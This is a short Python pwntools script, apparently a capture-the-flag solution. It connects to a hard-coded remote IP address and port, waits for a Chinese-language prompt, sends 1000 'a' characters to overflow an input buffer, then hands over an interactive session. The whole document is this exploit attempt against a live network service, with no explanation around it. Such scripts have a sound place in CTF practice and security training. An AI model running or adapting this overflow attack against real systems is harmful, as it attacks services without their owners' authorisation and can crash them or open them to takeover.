import pwn

server = pwn.remote('47.94.239.235', 4004)
server.recvuntil('表演:')
server.sendline('a' * 1000)
server.interactive()